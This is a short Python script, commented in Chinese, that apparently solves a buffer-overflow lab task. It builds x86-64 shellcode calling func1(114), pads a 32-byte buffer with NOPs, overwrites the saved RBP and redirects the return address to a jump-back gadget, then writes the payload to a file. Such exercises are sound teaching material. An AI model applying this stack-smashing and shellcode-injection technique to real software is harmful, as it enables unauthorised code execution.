import struct

# func1的地址
func1_addr = 0x401216

# jmp_xs的地址,跳回buffer开头
jmp_xs_addr = 0x401334


# 构造 Shellcode 调用 func1(114)
# 汇编逻辑：
#   push 0x72       (将 114 压栈)
#   pop rdi         (弹入 RDI 寄存器，这是 func1 的参数)
#   mov eax, 0x401216 (将 func1 地址放入 RAX)
#   call rax        (调用 func1)

shellcode = b''
shellcode += b'\x6a\x72'                    # push 0x72 (114)
shellcode += b'\x5f'                        # pop rdi
shellcode += b'\xb8\x16\x12\x40\x00'        # mov eax, 0x401216 (func1_addr)
shellcode += b'\xff\xd0'                    # call rax

print(shellcode)


# shellcode在buffer最开头
# buffer32字节，填入 shellcode，剩下的用 NOP (0x90) 填充
padding_len = 32 - len(shellcode)
payload = shellcode + b'\x90' * padding_len

# 覆盖 RBP 
payload += b'B' * 8

# 覆盖返回地址指向 jmp_xs
# func返回时执行jmp_xs，跳回shellcode
payload += struct.pack('<Q', jmp_xs_addr)


print(f"Payload 总长度: {len(payload)} 字节")

with open("ans3.txt", "wb") as f:
    f.write(payload)

print(payload)
